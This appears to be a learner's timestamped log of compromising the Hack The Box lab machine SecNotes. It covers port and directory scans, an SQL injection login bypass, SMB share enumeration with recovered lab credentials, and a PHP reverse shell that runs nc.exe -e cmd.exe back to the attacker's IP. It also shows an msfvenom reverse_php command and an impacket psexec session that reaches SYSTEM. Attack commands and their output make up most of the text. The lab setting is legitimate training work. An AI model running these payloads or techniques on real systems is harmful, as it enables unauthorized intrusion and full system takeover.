```

SecNotes Hackthebox
IP: 10.10.10.97
- impacket
- psexec
```

```
12:40 PM 1/16/2023
ping - destination host unreachable.
```

```
12:44 PM 1/16/2023
┌──(root㉿kali)-[/home/kali]
└─# nmap -sC -sV -Pn 10.10.10.97
Starting Nmap 7.93 ( https://nmap.org ) at 2023-01-16 17:41 EST
Nmap scan report for 10.10.10.97
Host is up (0.15s latency).
Not shown: 998 filtered tcp ports (no-response)
PORT    STATE SERVICE      VERSION
80/tcp  open  http         Microsoft IIS httpd 10.0
|_http-server-header: Microsoft-IIS/10.0
| http-methods: 
|_  Potentially risky methods: TRACE
| http-title: Secure Notes - Login
|_Requested resource was login.php
445/tcp open  microsoft-ds Windows 10 Enterprise 17134 microsoft-ds (workgroup: HTB)
Service Info: Host: SECNOTES; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2023-01-16T22:41:33
|_  start_date: N/A
|_clock-skew: mean: 2h40m01s, deviation: 4h37m09s, median: 0s
| smb2-security-mode: 
|   311: 
|_    Message signing enabled but not required
| smb-os-discovery: 
|   OS: Windows 10 Enterprise 17134 (Windows 10 Enterprise 6.3)
|   OS CPE: cpe:/o:microsoft:windows_10::-
|   Computer name: SECNOTES
|   NetBIOS computer name: SECNOTES\x00
|   Workgroup: HTB\x00
|_  System time: 2023-01-16T14:41:35-08:00
| smb-security-mode: 
|   account_used: <blank>
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 67.69 seconds
```

```
12:47 PM 1/16/2023
┌──(root㉿kali)-[/home/kali]
└─# dirsearch -u http://10.10.10.97:80 -x 400,401,403

  _|. _ _  _  _  _ _|_    v0.4.2
 (_||| _) (/_(_|| (_| )

Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 30 | Wordlist size: 10927

Output File: /root/.dirsearch/reports/10.10.10.97-80/_23-01-16_17-46-07.txt

Error Log: /root/.dirsearch/logs/errors-23-01-16_17-46-07.log

Target: http://10.10.10.97:80/

[17:46:07] Starting: 
[17:46:31] 500 -    1KB - /auth.php
[17:46:35] 302 -    0B  - /contact.php  ->  login.php
[17:46:36] 500 -    1KB - /db.php
[17:46:41] 302 -    0B  - /home.php  ->  login.php
[17:46:44] 200 -    1KB - /login.php
[17:46:45] 302 -    0B  - /logout.php  ->  login.php
[17:46:52] 200 -    2KB - /register.php

Task Completed
```

```
12:45 PM 1/16/2023
http://10.10.10.97/login.php																						#Login screen found here.
```

```
12:47 PM 1/16/2023
http://10.10.10.97/register.php																						#signup screen found here



┌──(root㉿kali)-[/home/kali]																							# probably not an smb method, going to checkout burp searchsploit version next..
└─#  smbclient -L \\\\10.10.10.97 -N          
session setup failed: NT_STATUS_ACCESS_DENIED
```

```
1:09 PM 1/16/2023																									# used sql injection, able to login.
whatever' or '1'='1
#																													## creds found on website tyler / 92g!mA8BGjOirkL%OG*& going to try smb map because it looks like a sharedrive
```

```
1:37 PM 1/16/2023
┌──(root㉿kali)-[/home/kali/Documents/transfer]
└─# smbmap -H 10.10.10.97 -u 'tyler' -p '92g!mA8BGjOirkL%OG*&' -r 'C$\\\secnotes.htb\new-site'
[+] IP: 10.10.10.97:445	Name: 10.10.10.97                                       
        Disk                                                  	Permissions	Comment
	----                                                  	-----------	-------
	C$                                                	NO ACCESS	
```

```                                                                                                                            
1:38 PM 1/16/2023
┌──(root㉿kali)-[/home/kali/Documents/transfer]
└─# smbmap -H 10.10.10.97 -u 'tyler' -p '92g!mA8BGjOirkL%OG*&' -r '\\secnotes.htb\new-site'
[+] IP: 10.10.10.97:445	Name: 10.10.10.97                                       
[!] Something weird happened: SMB SessionError: STATUS_OBJECT_NAME_NOT_FOUND(The object name is not found.) on line 881
[!] Something weird happened: SMB SessionError: STATUS_OBJECT_PATH_NOT_FOUND({Path Not Found} The path %hs does not exist.) on line 881
        Disk                                                  	Permissions	Comment
	----                                                  	-----------	-------
	ADMIN$                                            	NO ACCESS	Remote Admin
	C$                                                	NO ACCESS	Default share
	IPC$                                              	READ ONLY	Remote IPC
	new-site                                          	READ, WRITE												###### read write privileges!!!
                                                                                                                            
┌──(root㉿kali)-[/home/kali/Documents/transfer]
└─# 
```

```
1:43 PM 1/16/2023																											# nothing
nmap --script smb-vuln* -p 445 10.10.10.97
```

```
1:56 PM 1/16/2023
smbmap -H 10.10.10.97 -u 'tyler' -p '92g!mA8BGjOirkL%OG*&' -R 'new-site'										# able to list files in drive
[+] IP: 10.10.10.97:445	Name: 10.10.10.97                                       
        Disk                                                  	Permissions	Comment
	----                                                  	-----------	-------
	new-site                                          	READ, WRITE	
	.\new-site\*
	dr--r--r--                0 Mon Jan 16 18:56:12 2023	.
	dr--r--r--                0 Mon Jan 16 18:56:12 2023	..
	fr--r--r--              696 Thu Jun 21 16:15:36 2018	iisstart.htm
	fr--r--r--            98757 Thu Jun 21 16:15:38 2018	iisstart.png
                                                                                                                            
┌──(root㉿kali)-[/home/kali]
```

```
2:00 PM 1/16/2023																								# command to grab files in drives
smbmap -H 10.10.10.97 -u 'tyler' -p '92g!mA8BGjOirkL%OG*&' -R 'new-site' --download \new-site\iistart.htm 
smbmap -H 10.10.10.97 -u 'tyler' -p '92g!mA8BGjOirkL%OG*&' -R 'new-site' --download \new-site\iistart.png
```

```
2:10 PM 1/16/2023																								# unsure what else to do, not very experienced with smb, going to watch up to next point with walkthrough.
smbmap -H 10.10.10.97 -u 'tyler' -p '92g!mA8BGjOirkL%OG*&' -R 'IPC$'	
┌──(root㉿kali)-[/home/kali/Downloads]
└─# smbmap -H 10.10.10.97 -u 'tyler' -p '92g!mA8BGjOirkL%OG*&' -R 'IPC$'                                      
[+] IP: 10.10.10.97:445	Name: 10.10.10.97                                       
        Disk                                                  	Permissions	Comment
	----                                                  	-----------	-------
	IPC$                                              	READ ONLY	
	.\IPC$\*
	fr--r--r--                3 Sun Dec 31 19:03:58 1600	InitShutdown
	fr--r--r--                4 Sun Dec 31 19:03:58 1600	lsass
	fr--r--r--                3 Sun Dec 31 19:03:58 1600	ntsvcs
	fr--r--r--                3 Sun Dec 31 19:03:58 1600	scerpc
	fr--r--r--                1 Sun Dec 31 19:03:58 1600	Winsock2\CatalogChangeListener-35c-0
	fr--r--r--                3 Sun Dec 31 19:03:58 1600	epmapper
	fr--r--r--                1 Sun Dec 31 19:03:58 1600	Winsock2\CatalogChangeListener-1e4-0
	fr--r--r--                3 Sun Dec 31 19:03:58 1600	LSM_API_service
	fr--r--r--                3 Sun Dec 31 19:03:58 1600	eventlog
	fr--r--r--                1 Sun Dec 31 19:03:58 1600	Winsock2\CatalogChangeListener-1e0-0
	fr--r--r--                3 Sun Dec 31 19:03:58 1600	atsvc
	fr--r--r--                1 Sun Dec 31 19:03:58 1600	Winsock2\CatalogChangeListener-544-0
	fr--r--r--                3 Sun Dec 31 19:03:58 1600	spoolss
	fr--r--r--                1 Sun Dec 31 19:03:58 1600	Winsock2\CatalogChangeListener-774-0
	fr--r--r--                4 Sun Dec 31 19:03:58 1600	wkssvc
	fr--r--r--                3 Sun Dec 31 19:03:58 1600	trkwks
	fr--r--r--                3 Sun Dec 31 19:03:58 1600	tapsrv
	fr--r--r--                4 Sun Dec 31 19:03:58 1600	srvsvc
	fr--r--r--                1 Sun Dec 31 19:03:58 1600	mysqld2512_pipe
	fr--r--r--                1 Sun Dec 31 19:03:58 1600	vgauth-service
	fr--r--r--                1 Sun Dec 31 19:03:58 1600	Winsock2\CatalogChangeListener-26c-0
	fr--r--r--                1 Sun Dec 31 19:03:58 1600	Winsock2\CatalogChangeListener-274-0
	fr--r--r--                3 Sun Dec 31 19:03:58 1600	ROUTER
	fr--r--r--                3 Sun Dec 31 19:03:58 1600	MsFteWds
	fr--r--r--                1 Sun Dec 31 19:03:58 1600	SearchTextHarvester
	fr--r--r--                3 Sun Dec 31 19:03:58 1600	browser
	fr--r--r--                1 Sun Dec 31 19:03:58 1600	PSHost.133183824173261617.7404.DefaultAppDomain.powershell
	fr--r--r--                1 Sun Dec 31 19:03:58 1600	PSHost.133183824166018058.2984.DefaultAppDomain.powershell
	fr--r--r--                1 Sun Dec 31 19:03:58 1600	iisipm7ab7a2bc-1caf-4ebb-91f9-57d81063e6a7
	fr--r--r--                1 Sun Dec 31 19:03:58 1600	iislogpipe904e515a-557f-45db-9f63-1e89fbc8565d
	fr--r--r--                1 Sun Dec 31 19:03:58 1600	PIPE_EVENTROOT\CIMV2SCM EVENT PROVIDER
	fr--r--r--                3 Sun Dec 31 19:03:58 1600	W32TIME_ALT
	fr--r--r--                1 Sun Dec 31 19:03:58 1600	IISFCGI-37ad7c6a-9d86-436c-94e6-4bd4894419db
```

```
2:20 PM 1/16/2023																																										# new 8808 port 
┌──(root㉿kali)-[/home/kali/Downloads]
└─# nmap -sC -sV -p- -Pn 10.10.10.97                                  
Starting Nmap 7.93 ( https://nmap.org ) at 2023-01-16 19:14 EST
Stats: 0:01:42 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan
SYN Stealth Scan Timing: About 56.92% done; ETC: 19:17 (0:01:17 remaining)
Nmap scan report for 10.10.10.97
Host is up (0.12s latency).
Not shown: 65532 filtered tcp ports (no-response)
PORT     STATE SERVICE      VERSION
80/tcp   open  http         Microsoft IIS httpd 10.0
|_http-server-header: Microsoft-IIS/10.0
| http-title: Secure Notes - Login
|_Requested resource was login.php
| http-methods: 
|_  Potentially risky methods: TRACE
445/tcp  open  microsoft-ds Windows 10 Enterprise 17134 microsoft-ds (workgroup: HTB)
8808/tcp open  http         Microsoft IIS httpd 10.0													# fresh iis server
|_http-server-header: Microsoft-IIS/10.0
|_http-title: IIS Windows
| http-methods: 
|_  Potentially risky methods: TRACE
Service Info: Host: SECNOTES; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   311: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2023-01-17T00:17:40
|_  start_date: N/A
| smb-os-discovery: 
|   OS: Windows 10 Enterprise 17134 (Windows 10 Enterprise 6.3)
|   OS CPE: cpe:/o:microsoft:windows_10::-
|   Computer name: SECNOTES
|   NetBIOS computer name: SECNOTES\x00
|   Workgroup: HTB\x00
|_  System time: 2023-01-16T16:17:42-08:00
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
|_clock-skew: mean: 2h40m01s, deviation: 4h37m10s, median: 0s

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 203.59 seconds
```

```
2:41 PM 1/16/2023																					# creating windows-php-reverse-shell to put on smb server
┌──(root㉿kali)-[/home/kali/Documents/transfer]
└─# gedit windows-php-reverse-shell.php

┌──(root㉿kali)-[/home/kali/Documents/transfer]
└─# cat windows-php-reverse-shell.php  
<?php
system('nc.exe -e cmd.exe 10.10.16.21 4444')
?>
```

```
2:53 PM 1/16/2023
┌──(root㉿kali)-[/home/kali/Documents/transfer]														# locating nc.exe and copying to same /home/kali/Documents/transfer location to put onto smb server
└─# locate nc.exe                 
/usr/share/windows-resources/binaries/nc.exe
                                                                                                                            
┌──(root㉿kali)-[/home/kali/Documents/transfer]
└─# cp /usr/share/windows-resources/binaries/nc.exe nc.exe     

┌──(root㉿kali)-[/home/kali/Documents/transfer]														# showing same location while on smb server
└─# smbclient \\\\10.10.10.97\\new-site -U tyler
Password for [WORKGROUP\tyler]:
Try "help" to get a list of possible commands.
smb: \> 
```

```
2:56 PM 1/16/2023																					# put nc.exe and windows-php-reverse-shell.php onto smb server
smb: \> ls
  .                                   D        0  Mon Jan 16 19:05:53 2023
  ..                                  D        0  Mon Jan 16 19:05:53 2023
  iisstart.htm                        A      696  Thu Jun 21 11:26:03 2018
  iisstart.png                        A    98757  Thu Jun 21 11:26:03 2018

		7736063 blocks of size 4096. 3313607 blocks available
smb: \> put nc.exe
putting file nc.exe as \nc.exe (46.6 kb/s) (average 46.6 kb/s)
smb: \> put windows-php-reverse-shell.php
putting file windows-php-reverse-shell.php as \windows-php-reverse-shell.php (0.1 kb/s) (average 29.4 kb/s)
smb: \> ls
  .                                   D        0  Mon Jan 16 19:56:37 2023
  ..                                  D        0  Mon Jan 16 19:56:37 2023
  iisstart.htm                        A      696  Thu Jun 21 11:26:03 2018
  iisstart.png                        A    98757  Thu Jun 21 11:26:03 2018
  nc.exe                              A    59392  Mon Jan 16 19:56:21 2023
  windows-php-reverse-shell.php       A       54  Mon Jan 16 19:56:38 2023

		7736063 blocks of size 4096. 3313601 blocks available
smb: \> 
```

```
2:57 PM 1/16/2023																					# setting up nc listener 
┌──(root㉿kali)-[/home/kali/Documents/transfer]
└─# nc -lvnp 4444               
listening on [any] 4444 ...
```

```
2:57 PM 1/16/2023
msfvenom -p php/reverse_php LHOST=10.10.16.21 LPORT=4444 -o reverse.php
```

```

4:43 PM 1/16/2023
CALLING IT QUITS ON THIS BOX, NOTHING IS WORKING - FOR WHATEVER REASON THE SMB SERVER IS NOT RETAINING THE REVERSE SHELL I AM PUTTING ON ORE THE NC.EXE SO I AM UNABLE TO GET A SHELL - POSSIBLE REASON WHY THIS BOX IS RETIRED I AM NOT SURE
```

```
5:03 PM 1/16/2023
Going through walkthrough, once the guy is on the box he runs a history command and the command below is in the history

smbclient -U 'administrator%u6!4ZwgwOM#^OBf#Nwnh' \\\\10.10.10.97\\c$

┌──(root㉿kali)-[/home/kali/Documents/transfer]
└─# smbclient -U 'administrator%u6!4ZwgwOM#^OBf#Nwnh' \\\\10.10.10.97\\c$
Try "help" to get a list of possible commands.
smb: \> ls
  $Recycle.Bin                      DHS        0  Thu Jun 21 18:24:29 2018
  bootmgr                          AHSR   395268  Fri Jul 10 07:00:31 2015
  BOOTNXT                           AHS        1  Fri Jul 10 07:00:31 2015
  Config.Msi                        DHS        0  Mon Jan 25 10:24:50 2021
  Distros                             D        0  Thu Jun 21 18:07:52 2018
  Documents and Settings          DHSrn        0  Fri Jul 10 08:21:38 2015
  inetpub                             D        0  Thu Jun 21 21:47:33 2018
  Microsoft                           D        0  Fri Jun 22 17:09:10 2018
  pagefile.sys                      AHS 738197504  Mon Jan 16 20:23:22 2023
  PerfLogs                            D        0  Wed Apr 11 19:38:20 2018
  php7                                D        0  Thu Jun 21 11:15:24 2018
  Program Files                      DR        0  Tue Jan 26 05:39:51 2021
  Program Files (x86)                DR        0  Tue Jan 26 05:38:26 2021
  ProgramData                        DH        0  Sun Aug 19 17:56:49 2018
  Recovery                         DHSn        0  Thu Jun 21 17:52:17 2018
  swapfile.sys                      AHS 16777216  Mon Jan 16 20:23:22 2023
  System Volume Information         DHS        0  Thu Jun 21 17:53:13 2018
  Ubuntu.zip                          A 201749452  Thu Jun 21 18:07:28 2018
  Users                              DR        0  Thu Jun 21 18:00:39 2018
  Windows                             D        0  Tue Jan 26 05:38:46 2021

		7736063 blocks of size 4096. 3326472 blocks available

5:14 PM 1/16/2023
┌──(root㉿kali)-[/opt/impacket/impacket]																				# had to git clone  https://github.com/fortra/impacket.git in order to use psexec
└─# psexec.py administrator:'u6!4ZwgwOM#^OBf#Nwnh'@10.10.10.97														#psexec walkthrough.
Impacket v0.10.1.dev1+20230116.181610.efcaec35 - Copyright 2022 Fortra

[*] Requesting shares on 10.10.10.97.....
[*] Found writable share ADMIN$
[*] Uploading file bXHYxAcr.exe
[*] Opening SVCManager on 10.10.10.97.....
[*] Creating service yFaM on 10.10.10.97.....
[*] Starting service yFaM.....
[!] Press help for extra shell commands
Microsoft Windows [Version 10.0.17134.228]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\WINDOWS\system32> whoami
nt authority\system

C:\WINDOWS\system32> 
